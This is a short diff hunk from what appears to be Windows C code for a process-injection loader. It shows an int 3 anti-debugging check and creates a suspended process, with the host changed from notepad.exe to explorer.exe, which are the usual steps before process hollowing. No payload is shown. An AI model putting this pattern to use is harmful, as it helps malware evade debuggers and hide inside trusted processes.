@@ -201,7 +201,7 @@ inline int wmain()
 	__try {
 		__asm int 3;
 	}__except(EXCEPTION_EXECUTE_HANDLER){}
-	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
+	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\explorer.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
 		printf("error creating this trash process bye , %d!\n",GetLastError());
 		exit(1); 
 	}
